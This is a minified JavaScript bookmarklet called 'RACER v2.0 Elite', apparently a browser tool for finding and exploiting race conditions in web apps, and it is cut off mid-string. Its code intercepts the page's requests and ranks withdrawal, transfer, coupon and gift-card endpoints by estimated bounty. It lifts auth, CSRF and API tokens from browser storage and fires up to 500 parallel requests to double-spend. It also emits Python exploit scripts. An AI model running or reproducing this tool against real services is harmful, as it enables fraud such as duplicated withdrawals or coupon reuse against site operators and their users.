javascript:(function(){if(document.getElementById('racer')){return}var CSS='position:fixed;top:0;right:0;width:580px;height:100vh;background:linear-gradient(145deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);backdrop-filter:blur(10px);color:#e0e7ff;z-index:2147483647;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:13px;overflow:hidden;box-shadow:-12px 0 60px rgba(124,58,237,0.3),-4px 0 20px rgba(0,0,0,0.5);border-left:2px solid rgba(124,58,237,0.5)';var panel=document.createElement('div');panel.id='racer';panel.style.cssText=CSS;panel.innerHTML='<style>#racer *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}#racer{animation:slideIn 0.4s cubic-bezier(0.16,1,0.3,1)}@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}#racer .hdr{background:linear-gradient(135deg,rgba(124,58,237,0.15),rgba(99,102,241,0.1));backdrop-filter:blur(20px);padding:20px 24px;border-bottom:1px solid rgba(124,58,237,0.3);display:flex;justify-content:space-between;align-items:center;position:relative}#racer .hdr::after{content:"";position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(124,58,237,0.6),transparent)}#racer .hdr h2{font-size:20px;font-weight:700;background:linear-gradient(135deg,#a78bfa,#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:0.5px;display:flex;align-items:center;gap:8px}#racer .hdr h2::before{content:"ğŸ";font-size:24px;filter:drop-shadow(0 0 8px rgba(124,58,237,0.8))}#racer .ver{font-size:10px;color:#94a3b8;margin-left:8px;background:rgba(124,58,237,0.2);padding:2px 8px;border-radius:12px;font-weight:500}#racer .hdr-btns{display:flex;gap:8px}#racer .btn{background:linear-gradient(135deg,rgba(124,58,237,0.8),rgba(99,102,241,0.8));color:#fff;border:1px solid rgba(167,139,250,0.3);padding:8px 16px;cursor:pointer;border-radius:8px;font-size:12px;font-weight:600;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 2px 8px rgba(124,58,237,0.3);position:relative;overflow:hidden}#racer .btn::before{content:"";position:absolute;top:50%;left:50%;width:0;height:0;border-radius:50%;background:rgba(255,255,255,0.3);transform:translate(-50%,-50%);transition:width 0.6s,height 0.6s}#racer .btn:hover::before{width:300px;height:300px}#racer .btn:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(124,58,237,0.5);border-color:rgba(167,139,250,0.6)}#racer .btn:active{transform:translateY(0)}#racer .btn.danger{background:linear-gradient(135deg,rgba(239,68,68,0.8),rgba(220,38,38,0.8));box-shadow:0 2px 8px rgba(239,68,68,0.3)}#racer .btn.danger:hover{box-shadow:0 4px 16px rgba(239,68,68,0.5)}#racer .btn.success{background:linear-gradient(135deg,rgba(16,185,129,0.8),rgba(5,150,105,0.8));box-shadow:0 2px 8px rgba(16,185,129,0.3)}#racer .btn.success:hover{box-shadow:0 4px 16px rgba(16,185,129,0.5)}#racer .tabs{display:flex;background:rgba(15,23,42,0.6);backdrop-filter:blur(10px);border-bottom:1px solid rgba(124,58,237,0.2);overflow-x:auto;gap:4px;padding:4px}#racer .tabs::-webkit-scrollbar{height:4px}#racer .tabs::-webkit-scrollbar-track{background:rgba(0,0,0,0.2)}#racer .tabs::-webkit-scrollbar-thumb{background:rgba(124,58,237,0.5);border-radius:2px}#racer .tab{padding:12px 20px;cursor:pointer;border-radius:8px;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);white-space:nowrap;font-size:13px;font-weight:600;color:#94a3b8;position:relative}#racer .tab::after{content:"";position:absolute;bottom:0;left:50%;right:50%;height:2px;background:linear-gradient(90deg,#a78bfa,#818cf8);transition:all 0.3s cubic-bezier(0.4,0,0.2,1);opacity:0}#racer .tab:hover{color:#e0e7ff;background:rgba(124,58,237,0.1)}#racer .tab.active{color:#fff;background:linear-gradient(135deg,rgba(124,58,237,0.3),rgba(99,102,241,0.2));box-shadow:inset 0 1px 0 rgba(255,255,255,0.1)}#racer .tab.active::after{left:10%;right:10%;opacity:1}#racer .content{height:calc(100vh - 180px);overflow-y:auto;padding:20px}#racer .content::-webkit-scrollbar{width:10px}#racer .content::-webkit-scrollbar-track{background:rgba(0,0,0,0.2);border-radius:5px}#racer .content::-webkit-scrollbar-thumb{background:linear-gradient(180deg,rgba(124,58,237,0.6),rgba(99,102,241,0.6));border-radius:5px;border:2px solid rgba(15,23,42,0.5)}#racer .content::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,rgba(124,58,237,0.8),rgba(99,102,241,0.8))}#racer .test-box{background:linear-gradient(135deg,rgba(30,41,59,0.6),rgba(15,23,42,0.8));backdrop-filter:blur(10px);padding:20px;margin:16px 0;border-left:3px solid rgba(124,58,237,0.6);border-radius:12px;position:relative;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 4px 12px rgba(0,0,0,0.3);border:1px solid rgba(124,58,237,0.2)}#racer .test-box::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,rgba(124,58,237,0.05),transparent);border-radius:12px;opacity:0;transition:opacity 0.3s}#racer .test-box:hover{border-left-width:4px;transform:translateX(4px);box-shadow:0 8px 24px rgba(124,58,237,0.4);border-color:rgba(124,58,237,0.4)}#racer .test-box:hover::before{opacity:1}#racer .test-box.vulnerable{border-left-color:rgba(239,68,68,0.8);background:linear-gradient(135deg,rgba(59,7,7,0.4),rgba(15,23,42,0.8));animation:pulse-vuln 2s ease-in-out infinite}#racer .test-box.safe{border-left-color:rgba(16,185,129,0.8);background:linear-gradient(135deg,rgba(6,78,59,0.3),rgba(15,23,42,0.8))}#racer .test-box.verified{border-left-color:rgba(34,211,238,0.8);background:linear-gradient(135deg,rgba(8,47,73,0.4),rgba(15,23,42,0.8));box-shadow:0 4px 20px rgba(34,211,238,0.3)}#racer .endpoint-input,#racer select,#racer textarea{width:100%;background:rgba(15,23,42,0.8);border:2px solid rgba(124,58,237,0.3);color:#e0e7ff;padding:12px 16px;border-radius:10px;font-family:monospace;font-size:13px;margin:10px 0;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);backdrop-filter:blur(10px)}#racer .endpoint-input:focus,#racer select:focus,#racer textarea:focus{outline:none;border-color:rgba(167,139,250,0.8);box-shadow:0 0 0 4px rgba(124,58,237,0.2),0 0 20px rgba(124,58,237,0.3);transform:translateY(-1px)}#racer .endpoint-input::placeholder{color:#64748b}#racer .stat{background:linear-gradient(135deg,rgba(30,41,59,0.5),rgba(15,23,42,0.7));backdrop-filter:blur(10px);padding:18px 20px;margin:12px 0;border-left:3px solid rgba(124,58,237,0.6);border-radius:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(124,58,237,0.2);transition:all 0.3s}#racer .stat:hover{border-color:rgba(124,58,237,0.4);box-shadow:0 4px 16px rgba(124,58,237,0.2)}#racer .stat h3{color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px;font-weight:600}#racer .cnt{color:#fff;font-size:32px;font-weight:700;background:linear-gradient(135deg,#a78bfa,#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 20px rgba(124,58,237,0.5)}#racer .badge{display:inline-block;padding:4px 10px;border-radius:6px;font-size:10px;font-weight:700;margin-left:6px;text-transform:uppercase;letter-spacing:0.5px;box-shadow:0 2px 4px rgba(0,0,0,0.2)}#racer .badge.score{background:linear-gradient(135deg,rgba(16,185,129,0.8),rgba(5,150,105,0.8));color:#fff}#racer .badge.h1{background:linear-gradient(135deg,rgba(239,68,68,0.9),rgba(220,38,38,0.9));color:#fff;animation:pulse-badge 1.5s ease-in-out infinite}#racer .badge.crit{background:linear-gradient(135deg,rgba(239,68,68,0.9),rgba(220,38,38,0.9));color:#fff}#racer .badge.high{background:linear-gradient(135deg,rgba(251,146,60,0.9),rgba(249,115,22,0.9));color:#fff}#racer .badge.med{background:linear-gradient(135deg,rgba(234,179,8,0.9),rgba(202,138,4,0.9));color:#000}#racer .badge.verified{background:linear-gradient(135deg,rgba(34,211,238,0.9),rgba(6,182,212,0.9));color:#fff}#racer .vuln-badge{display:inline-block;padding:4px 12px;background:linear-gradient(135deg,rgba(239,68,68,0.9),rgba(220,38,38,0.9));color:#fff;border-radius:6px;font-size:10px;font-weight:700;margin-left:6px;box-shadow:0 2px 8px rgba(239,68,68,0.4)}#racer .safe-badge{display:inline-block;padding:4px 12px;background:linear-gradient(135deg,rgba(16,185,129,0.9),rgba(5,150,105,0.9));color:#fff;border-radius:6px;font-size:10px;font-weight:700;margin-left:6px;box-shadow:0 2px 8px rgba(16,185,129,0.4)}#racer .code{background:rgba(0,0,0,0.6);border:1px solid rgba(124,58,237,0.3);padding:16px;border-radius:10px;font-family:monospace;font-size:12px;color:#22d3ee;margin:12px 0;overflow-x:auto;max-height:300px;line-height:1.6;box-shadow:inset 0 2px 8px rgba(0,0,0,0.3)}#racer .code::-webkit-scrollbar{height:8px}#racer .code::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:4px}#racer .code::-webkit-scrollbar-thumb{background:rgba(124,58,237,0.5);border-radius:4px}#racer .progress{width:100%;height:8px;background:rgba(0,0,0,0.4);border-radius:10px;overflow:hidden;margin:12px 0;box-shadow:inset 0 2px 4px rgba(0,0,0,0.3)}#racer .progress-bar{height:100%;background:linear-gradient(90deg,#a78bfa,#818cf8,#ec4899);background-size:200% 100%;animation:shimmer 2s linear infinite;transition:width 0.4s cubic-bezier(0.4,0,0.2,1);box-shadow:0 0 16px rgba(124,58,237,0.8)}@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}#racer .result-item{background:linear-gradient(135deg,rgba(30,41,59,0.5),rgba(15,23,42,0.7));backdrop-filter:blur(10px);padding:16px;margin:10px 0;border-radius:10px;border-left:3px solid rgba(124,58,237,0.6);border:1px solid rgba(124,58,237,0.2);transition:all 0.3s}#racer .result-item:hover{border-color:rgba(124,58,237,0.4);box-shadow:0 4px 12px rgba(124,58,237,0.2)}#racer .result-item.vuln{border-left-color:rgba(239,68,68,0.8);background:linear-gradient(135deg,rgba(59,7,7,0.3),rgba(15,23,42,0.7))}#racer .result-item.verified{border-left-color:rgba(34,211,238,0.8);background:linear-gradient(135deg,rgba(8,47,73,0.3),rgba(15,23,42,0.7));box-shadow:0 2px 12px rgba(34,211,238,0.2)}#racer .race-viz{display:flex;gap:3px;margin:12px 0;flex-wrap:wrap}#racer .race-req{width:10px;height:36px;background:linear-gradient(180deg,rgba(16,185,129,0.8),rgba(5,150,105,0.8));border-radius:4px;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 2px 4px rgba(0,0,0,0.2)}#racer .race-req:hover{transform:scaleY(1.1);box-shadow:0 4px 8px rgba(16,185,129,0.4)}#racer .race-req.fail{background:linear-gradient(180deg,rgba(239,68,68,0.8),rgba(220,38,38,0.8));box-shadow:0 2px 4px rgba(239,68,68,0.3)}#racer .race-req.fail:hover{box-shadow:0 4px 8px rgba(239,68,68,0.5)}#racer .race-req.pending{background:linear-gradient(180deg,rgba(251,146,60,0.8),rgba(249,115,22,0.8))}#racer .hint{background:linear-gradient(135deg,rgba(30,58,138,0.3),rgba(29,78,216,0.2));backdrop-filter:blur(10px);padding:16px;border-radius:10px;font-size:13px;line-height:1.8;color:#cbd5e1;margin:12px 0;border-left:3px solid rgba(59,130,246,0.6);border:1px solid rgba(59,130,246,0.2)}#racer .bounty-est{background:linear-gradient(135deg,rgba(6,78,59,0.4),rgba(4,120,87,0.3));backdrop-filter:blur(10px);padding:12px 16px;border-radius:10px;margin:12px 0;border-left:3px solid rgba(16,185,129,0.6);border:1px solid rgba(16,185,129,0.2);box-shadow:0 2px 8px rgba(16,185,129,0.2)}#racer h3{color:#e0e7ff;font-size:16px;font-weight:600;margin-bottom:16px;padding-bottom:8px;border-bottom:2px solid rgba(124,58,237,0.3);background:linear-gradient(90deg,#a78bfa,#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}#racer h4{color:#cbd5e1;font-size:14px;font-weight:600;margin:20px 0 12px 0}#racer label{color:#94a3b8;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}@keyframes pulse-vuln{0%,100%{border-left-color:rgba(239,68,68,0.8);box-shadow:0 0 0 rgba(239,68,68,0)}50%{border-left-color:rgba(239,68,68,1);box-shadow:0 0 24px rgba(239,68,68,0.6)}}@keyframes pulse-badge{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.8;transform:scale(1.05)}}</style><div class="hdr"><h2>RACER<span class="ver">v2.0 Elite By shadowxp</span></h2><div class="hdr-btns"><button class="btn" id="racExport">ğŸ“¤ Export</button><button class="btn danger" id="racClose">âœ•</button></div></div><div class="tabs"><div class="tab active" data-tab="detect">ğŸ” Auto Detect</div><div class="tab" data-tab="manual">ğŸ® Manual Test</div><div class="tab" data-tab="results">ğŸ“Š Results</div><div class="tab" data-tab="exploits">ğŸ’£ Exploits</div></div><div class="content"><div id="rac-detect" class="tc"></div><div id="rac-manual" class="tc" style="display:none"></div><div id="rac-results" class="tc" style="display:none"></div><div id="rac-exploits" class="tc" style="display:none"></div></div>';document.body.appendChild(panel);var RAC={captured:[],vulnerable:[],tested:[],results:[],scanning:false,stateSnapshots:{}};var originalFetch=window.fetch;var originalXHR=window.XMLHttpRequest.prototype.open;window.fetch=function(){var url=typeof arguments[0]==='string'?arguments[0]:arguments[0].url;var opts=arguments[1]||{};if(!url.includes('racer')&&!url.includes('chrome-extension')){var req={method:opts.method||'GET',url:url,fullUrl:new URL(url,window.location.origin).href,body:opts.body,headers:opts.headers||{},timestamp:Date.now(),type:'fetch'};RAC.captured.push(req)}return originalFetch.apply(this,arguments)};XMLHttpRequest.prototype.open=function(method,url){if(!url.includes('racer')&&!url.includes('chrome-extension')){RAC.captured.push({method:method,url:url,fullUrl:new URL(url,window.location.origin).href,timestamp:Date.now(),type:'xhr'})}return originalXHR.apply(this,arguments)};function analyzeForRaceConditions(reqs){var candidates=[];var patterns=[{name:'Balance/Wallet Withdrawal',keywords:['withdraw','withdrawal','balance','wallet','funds','payout'],methods:['POST','PUT'],score:98,severity:'CRITICAL',bounty:[25000,50000],h1Report:true,reference:'Common in crypto/banking apps'},{name:'Fund Transfer',keywords:['transfer','send','move_funds','payment_transfer'],methods:['POST'],score:97,severity:'CRITICAL',bounty:[20000,45000],reference:'Banking/P2P payment apps'},{name:'Voucher/Coupon Redemption',keywords:['voucher','coupon','promo','discount','redeem','apply_code','apply_voucher'],methods:['POST','PUT'],score:95,severity:'CRITICAL',bounty:[10000,35000],h1Report:true,reference:'Reverb.com H1 report'},{name:'Gift Card Application',keywords:['gift','gift_card','giftcard','credit','apply_credit'],methods:['POST','PUT'],score:94,severity:'CRITICAL',bounty:[12000,40000],h1Report:true,reference:'Multiple H1 reports'},{name:'Purchase/Payment Processing',keywords:['payment','checkout','purchase','buy','order','pay','process_payment'],methods:['POST'],score:92,severity:'CRITICAL',bounty:[8000,30000],reference:'E-commerce race conditions'},{name:'User Invitation',keywords:['invite','send_invite','invitation','invite_user'],methods:['POST'],score:88,severity:'HIGH',bounty:[3000,15000],h1Report:true,reference:'HackerOne/Omise H1 reports'},{name:'Group/Team Join',keywords:['join','join_group','join_team','member_add','group_add'],methods:['POST','PUT'],score:85,severity:'HIGH',bounty:[2000,12000],h1Report:true,reference:'HackerOne CTF H1 report'},{name:'Retest/Confirmation',keywords:['retest','confirm','verify','validate','approve'],methods:['POST','PUT'],score:82,severity:'HIGH',bounty:[5000,20000],h1Report:true,reference:'HackerOne retest payment'},{name:'Booking/Reservation',keywords:['book','reserve','reservation','ticket','appointment','slot'],methods:['POST'],score:80,severity:'MEDIUM',bounty:[3000,15000],reference:'Booking system races'},{name:'Social Interactions',keywords:['like','follow','subscribe','upvote','downvote','vote','favorite'],methods:['POST','PUT','DELETE'],score:78,severity:'MEDIUM',bounty:[1000,8000],h1Report:true,reference:'Every.org, HackerOne H1'},{name:'Flag/Score Submission',keywords:['submit','flag','score','points','achievement'],methods:['POST'],score:75,severity:'MEDIUM',bounty:[1500,10000],h1Report:true,reference:'HackerOne CTF H1 report'},{name:'Update Resource',keywords:['update','edit','modify','change','patch'],methods:['POST','PUT','PATCH'],score:70,severity:'MEDIUM',bounty:[1000,5000],reference:'General update operations'}];reqs.forEach(function(req){if(!['POST','PUT','PATCH','DELETE'].includes(req.method)){return}var urlLower=req.fullUrl.toLowerCase();var bodyLower='';try{if(req.body){bodyLower=typeof req.body==='string'?req.body.toLowerCase():JSON.stringify(req.body).toLowerCase()}}catch(e){}patterns.forEach(function(pat){if(!pat.methods.includes(req.method)){return}var matchCount=0;var matchedKeywords=[];pat.keywords.forEach(function(kw){if(urlLower.includes(kw)||bodyLower.includes(kw)){matchCount++;matchedKeywords.push(kw)}});if(matchCount>0){var adjustedScore=pat.score+(matchCount*2);candidates.push({endpoint:req.fullUrl,method:req.method,category:pat.name,score:adjustedScore,severity:pat.severity,bounty:pat.bounty,h1Report:pat.h1Report||false,reference:pat.reference,matchedKeywords:matchedKeywords,body:req.body,headers:req.headers,originalReq:req})}})});var unique={};candidates.forEach(function(c){var key=c.endpoint+c.method;if(!unique[key]||unique[key].score<c.score){unique[key]=c}});return Object.values(unique).sort(function(a,b){return b.score-a.score})}function injectCredentials(headers){var enhanced=headers||{};var csrfToken=document.querySelector('meta[name="csrf-token"]')?.content||document.querySelector('meta[name="_csrf"]')?.content||document.querySelector('input[name="_csrf"]')?.value||document.querySelector('input[name="csrf_token"]')?.value;if(csrfToken){enhanced['X-CSRF-Token']=csrfToken;enhanced['X-XSRF-TOKEN']=csrfToken}var token=localStorage.getItem('token')||localStorage.getItem('authToken')||localStorage.getItem('auth_token')||localStorage.getItem('jwt')||localStorage.getItem('access_token')||sessionStorage.getItem('token')||sessionStorage.getItem('authToken');if(token){enhanced['Authorization']=token.startsWith('Bearer ')?token:'Bearer '+token}var apiKey=localStorage.getItem('apiKey')||localStorage.getItem('api_key')||localStorage.getItem('X-API-Key');if(apiKey){enhanced['X-API-Key']=apiKey}return enhanced}async function captureStateSnapshot(label){var snapshot={label:label,timestamp:Date.now(),balance:null,data:{},dom:{}};var balanceEndpoints=['/api/balance','/api/wallet','/api/wallet/balance','/api/user/balance','/api/account/balance','/api/user/wallet'];for(var i=0;i<balanceEndpoints.length;i++){try{var resp=await fetch(balanceEndpoints[i],{credentials:'include'});if(resp.ok){var data=await resp.json();snapshot.balance=data.balance||data.amount||data.value||data.total||data.available_balance;snapshot.data=data;break}}catch(e){}}var balanceEls=document.querySelectorAll('[class*="balance"],[class*="wallet"],[id*="balance"],[data-balance]');balanceEls.forEach(function(el){var text=el.textContent;var match=text.match(/[\$â‚¬Â£â‚¹Â¥]?([\d,]+\.?\d*)/);if(match&&!snapshot.balance){snapshot.balance=parseFloat(match[1].replace(/,/g,''));snapshot.dom.element=el.tagName;snapshot.dom.text=text}});return snapshot}async function testRaceCondition(endpoint,method,body,headers,parallelCount){var startTime=Date.now();var promises=[];var results={success:0,fail:0,responses:[],timing:[],errors:[]};var enhancedHeaders=injectCredentials(headers);var beforeState=await captureStateSnapshot('before_test');for(var i=0;i<parallelCount;i++){var reqStart=Date.now();var promise=fetch(endpoint,{method:method,body:body,headers:enhancedHeaders,credentials:'include'}).then(function(res){var reqTime=Date.now()-reqStart;results.timing.push(reqTime);if(res.ok){results.success++}else{results.fail++}return res.clone().text().then(function(text){results.responses.push({status:res.status,ok:res.ok,body:text,headers:Array.from(res.headers.entries()),timing:reqTime});return res})}).catch(function(err){var reqTime=Date.now()-reqStart;results.timing.push(reqTime);results.fail++;results.errors.push(err.message);return null});promises.push(promise)}await Promise.all(promises);results.duration=Date.now()-startTime;await new Promise(function(r){setTimeout(r,1000)});var afterState=await captureStateSnapshot('after_test');results.beforeState=beforeState;results.afterState=afterState;results.stateVerification=verifyStateChange(beforeState,afterState);return results}function verifyStateChange(before,after){var verification={changed:false,verified:false,proof:[],impact:'Unknown'};if(before.balance!==null&&after.balance!==null){var diff=after.balance-before.balance;if(Math.abs(diff)>0.01){verification.changed=true;verification.verified=true;verification.proof.push('Balance: $'+before.balance.toFixed(2)+' â†’ $'+after.balance.toFixed(2));verification.proof.push('Difference: $'+diff.toFixed(2));if(diff<0&&Math.abs(diff)>before.balance){verification.impact='CRITICAL - Negative balance achieved';verification.proof.push('âš ï¸ Balance went negative!')}else if(diff>0){verification.impact='HIGH - Unauthorized credit'}else{verification.impact='MEDIUM - Balance manipulation'}}}else if(before.dom.text&&after.dom.text&&before.dom.text!==after.dom.text){verification.changed=true;verification.proof.push('DOM: "'+before.dom.text+'" â†’ "'+after.dom.text+'"')}return verification}function isVulnerable(results,expected){var vuln={vulnerable:false,reason:'',severity:'SAFE',confidence:0};if(results.success>expected){var excess=results.success-expected;vuln.vulnerable=true;vuln.reason='More successes than expected ('+results.success+' > '+expected+')';vuln.severity=excess>expected*5?'CRITICAL':'HIGH';vuln.confidence=Math.min(95,60+(excess/expected)*10);if(results.stateVerification.verified){vuln.severity='CRITICAL - VERIFIED';vuln.confidence=100;vuln.reason+=' | State verified: '+results.stateVerification.proof.join(', ')}}else{var uniqueResponses=new Set(results.responses.map(function(r){return r.body}));if(uniqueResponses.size<results.responses.length*0.5&&results.success>expected){vuln.vulnerable=true;vuln.reason='Duplicate responses (possible race)';vuln.severity='HIGH';vuln.confidence=75}}if(results.success>0&&results.fail>0){var ratio=results.success/(results.success+results.fail);if(ratio>0.2&&ratio<0.8&&results.success>expected&&!vuln.vulnerable){vuln.vulnerable=true;vuln.reason='Inconsistent pattern ('+results.success+' success, '+results.fail+' fail)';vuln.severity='MEDIUM';vuln.confidence=65}}if(!vuln.vulnerable){vuln.reason='No race condition detected';vuln.confidence=85}return vuln}function generateAdvancedExploit(testData){var exploit='#!/usr/bin/env python3\n"""RACER V2.0 Elite - Race Condition Exploit\n\nTarget: '+testData.endpoint+'\nMethod: '+testData.method+'\nSeverity: '+testData.vulnerable.severity+'\n"""\nimport asyncio,aiohttp,time\nfrom colorama import Fore,Style,init\ninit(autoreset=True)\n\nTARGET="'+testData.endpoint+'"\nMETHOD="'+testData.method+'"\nPARALLEL='+testData.count+'\nEXPECTED='+testData.expected+'\n';if(testData.body){exploit+='BODY=\'\'\''+testData.body+'\'\'\'\n'}exploit+='\nasync def exploit():\n    print(f"{Fore.CYAN}[*] RACER V2.0 - Starting attack...")\n    async with aiohttp.ClientSession() as s:\n        tasks=[s.'+testData.method.lower()+'(TARGET';if(testData.body){exploit+=',data=BODY'}exploit+=') for _ in range(PARALLEL)]\n        r=await asyncio.gather(*tasks,return_exceptions=True)\n        success=sum(1 for x in r if not isinstance(x,Exception)and x.status==200)\n        print(f"{Fore.GREEN}âœ“ Success: {success}")\n        print(f"{Fore.RED}âœ— Failed: {len(r)-success}")\n        if success>EXPECTED:print(f"{Fore.GREEN}ğŸ”´ RACE DETECTED!")\n\nif __name__=="__main__":asyncio.run(exploit())\n';return exploit}function renderDetect(){var h='<h3>ğŸ” Auto Detection</h3>';h+='<div class="stat"><h3>ğŸ“¡ Requests Captured</h3><div class="cnt">'+RAC.captured.length+'</div></div>';var candidates=analyzeForRaceConditions(RAC.captured);h+='<div class="stat"><h3>ğŸ¯ Race Candidates</h3><div class="cnt">'+candidates.length+'</div></div>';if(candidates.length===0){h+='<div class="hint">';h+='<strong>â³ Waiting for race-prone requests...</strong><br><br>';h+='<strong>High-Value Actions:</strong><br>';h+='ğŸ’° Withdraw/transfer funds<br>';h+='ğŸ« Apply vouchers/coupons<br>';h+='ğŸ’³ Make purchases/payments<br>';h+='ğŸ“§ Send invites/join groups<br>';h+='ğŸ‘ Like/follow/vote/bookmark<br>';h+='ğŸ Redeem gift cards<br>';h+='ğŸ“… Book tickets/reserve<br>';h+='</div>'}else{h+='<h4>ğŸ¯ High-Priority Targets</h4>';candidates.slice(0,8).forEach(function(c,i){h+='<div class="test-box">';h+='<strong>'+c.category+'</strong> ';h+='<span class="badge score">'+c.score+'</span>';h+='<span class="badge '+c.severity.toLowerCase().substring(0,4)+'">'+c.severity+'</span>';if(c.h1Report){h+='<span class="badge h1">H1</span>'}h+='<br>';h+='<span style="color:#a78bfa;font-weight:600">'+c.method+'</span> ';h+='<span style="color:#64748b;font-size:11px">'+c.endpoint+'</span><br>';h+='<div style="margin-top:8px;font-size:11px;color:#64748b;line-height:1.6">';h+='ğŸ”‘ '+c.matchedKeywords.join(', ')+'<br>';h+='ğŸ“š '+c.reference;h+='</div>';if(c.bounty){h+='<div class="bounty-est" style="margin-top:10px">';h+='ğŸ’° <strong>Bounty:</strong> $'+c.bounty[0].toLocaleString()+' - $'+c.bounty[1].toLocaleString();h+='</div>'}h+='<button class="btn success" style="margin-top:12px" onclick="window.testRaceFromDetect('+i+')">ğŸ Test Race</button>';h+='</div>'})}document.getElementById('rac-detect').innerHTML=h}function renderManual(){var h='<h3>ğŸ® Manual Race Test</h3>';h+='<div class="hint">ğŸ’¡ <strong>Pro Tip:</strong> Use Auto Detect first!</div>';h+='<label>Endpoint URL:</label>';h+='<input type="text" id="racEndpoint" class="endpoint-input" placeholder="https://api.site.com/api/withdraw">';h+='<label>HTTP Method:</label>';h+='<select id="racMethod" class="endpoint-input" style="width:auto"><option>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option></select>';h+='<label>Request Body (JSON):</label>';h+='<textarea id="racBody" class="endpoint-input" style="height:100px" placeholder=\'{"amount":100}\'></textarea>';h+='<label>Parallel Requests:</label>';h+='<input type="number" id="racCount" class="endpoint-input" value="50" min="10" max="500" style="width:150px">';h+='<label>Expected Successes:</label>';h+='<input type="number" id="racExpected" class="endpoint-input" value="1" min="0" max="100" style="width:150px">';h+='<button class="btn success" style="margin-top:20px;width:100%;padding:16px;font-size:14px" id="racStartManual">ğŸš€ START RACE ATTACK</button>';h+='<div id="racProgress" style="margin-top:20px"></div>';document.getElementById('rac-manual').innerHTML=h;document.getElementById('racStartManual').onclick=function(){var endpoint=document.getElementById('racEndpoint').value;var method=document.getElementById('racMethod').value;var body=document.getElementById('racBody').value;var count=parseInt(document.getElementById('racCount').value);var expected=parseInt(document.getElementById('racExpected').value);if(!endpoint){alert('âš ï¸ Enter endpoint URL');return}if(count<10||count>500){alert('âš ï¸ Parallel: 10-500');return}runManualTest(endpoint,method,body,count,expected)}}function renderResults(){var h='<h3>ğŸ“Š Test Results</h3>';h+='<div class="stat"><h3>ğŸ§ª Tests Run</h3><div class="cnt">'+RAC.tested.length+'</div></div>';h+='<div class="stat"><h3>ğŸ”´ Vulnerable</h3><div class="cnt">'+RAC.vulnerable.length+'</div></div>';if(RAC.results.length===0){h+='<div class="hint">ğŸ“‹ No tests yet.<br><br>Test endpoints from <strong>Auto Detect</strong> or <strong>Manual Test</strong>.</div>'}else{RAC.results.forEach(function(r,i){var vulnClass=r.vulnerable.vulnerable?(r.vulnerable.severity.includes('VERIFIED')?'verified':'vulnerable'):'safe';h+='<div class="result-item '+vulnClass+'">';h+='<strong>Test #'+(i+1)+'</strong> ';if(r.vulnerable.vulnerable){h+='<span class="vuln-badge">'+r.vulnerable.severity+'</span>';if(r.results.stateVerification.verified){h+='<span class="badge verified">âœ“ VERIFIED</span>'}}else{h+='<span class="safe-badge">âœ… SAFE</span>'}h+='<br><span style="color:#a78bfa;font-weight:600">'+r.method+'</span> ';h+='<span style="color:#64748b;font-size:11px">'+r.endpoint+'</span><br>';h+='<div style="margin-top:12px;font-size:12px;line-height:1.8">';h+='<strong>Results:</strong> ';h+='<span style="color:#10b981">âœ“ '+r.results.success+'</span> / ';h+='<span style="color:#ef4444">âœ— '+r.results.fail+'</span> | ';h+='<span style="color:#f59e0b">â± '+r.results.duration+'ms</span><br>';if(r.vulnerable.vulnerable){h+='<strong style="color:#ef4444">âš ï¸ Vulnerability:</strong><br>';h+='<span style="color:#ef4444">'+r.vulnerable.reason+'</span><br>';h+='<strong>Confidence:</strong> '+r.vulnerable.confidence+'%<br>';if(r.results.stateVerification.verified){h+='<br><strong style="color:#10b981">âœ“ VERIFIED PROOF:</strong><br>';r.results.stateVerification.proof.forEach(function(p){h+='<span style="color:#10b981">â€¢ '+p+'</span><br>'});h+='<strong>Impact:</strong> '+r.results.stateVerification.impact+'<br>'}}else{h+='<span style="color:#10b981">âœ… '+r.vulnerable.reason+'</span>'}h+='</div>';h+='<div class="race-viz">';for(var j=0;j<Math.min(r.count,100);j++){var cls=j<r.results.success?'':' fail';h+='<div class="race-req'+cls+'"></div>'}h+='</div>';h+='</div>'})}document.getElementById('rac-results').innerHTML=h}function renderExploits(){var h='<h3>ğŸ’£ Exploit Generator</h3>';var vulns=RAC.results.filter(function(r){return r.vulnerable.vulnerable});if(vulns.length===0){h+='<div class="hint">ğŸ” No vulnerabilities yet.<br><br>Test endpoints to generate exploits!</div>'}else{vulns.forEach(function(v,i){h+='<div class="test-box vulnerable">';h+='<strong>ğŸ¯ EXPLOIT #'+(i+1)+'</strong> ';h+='<span class="vuln-badge">'+v.vulnerable.severity+'</span>';if(v.results.stateVerification.verified){h+='<span class="badge verified">âœ“ VERIFIED</span>'}h+='<br>';h+='<span style="color:#a78bfa;font-weight:600">'+v.method+'</span> ';h+='<span style="color:#64748b;font-size:11px">'+v.endpoint+'</span><br><br>';h+='<strong style="color:#a78bfa">ğŸ”´ VULNERABILITY:</strong><br>';h+='<p style="margin:5px 0;line-height:1.6">'+v.vulnerable.reason+'</p>';if(v.results.stateVerification.verified){h+='<br><strong style="color:#10b981">âœ“ 